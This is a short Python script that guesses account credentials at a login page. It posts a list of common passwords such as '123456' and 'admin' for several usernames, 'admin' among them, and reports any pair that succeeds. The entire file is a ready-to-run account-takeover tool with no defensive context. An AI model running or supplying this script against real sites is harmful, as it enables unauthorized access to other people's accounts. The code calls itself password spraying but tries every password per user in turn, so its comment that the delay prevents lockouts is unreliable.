import requests
from time import sleep

# Target website login URL
login_url = "http://example.com/login"

# Common password list (add more if you want)
password_list = ["123456", "password", "12345", "qwerty", "letmein", "admin", "welcome"]

# List of usernames (these should be valid usernames you want to test)
usernames = ["user1", "user2", "admin"]

# Function to attempt login with a username and password
def attempt_login(username, password):
    data = {
        'username': username,
        'password': password,
    }
    try:
        response = requests.post(login_url, data=data)
        # Check for successful login (this will vary depending on the website's response)
        if "Login successful" in response.text:
            print(f"[+] Success: {username} with password {password}")
            return True
        else:
            print(f"[-] Failed: {username} with password {password}")
            return False
    except Exception as e:
        print(f"Error with {username}: {e}")
        return False

# Password spraying function
def password_spray():
    for username in usernames:
        for password in password_list:
            print(f"Attempting {username}:{password}")
            success = attempt_login(username, password)
            if success:
                print(f"[*] Successfully logged in: {username}:{password}")
                return
            sleep(2)  # To avoid locking out accounts or getting blocked

# Run the password spraying
password_spray()
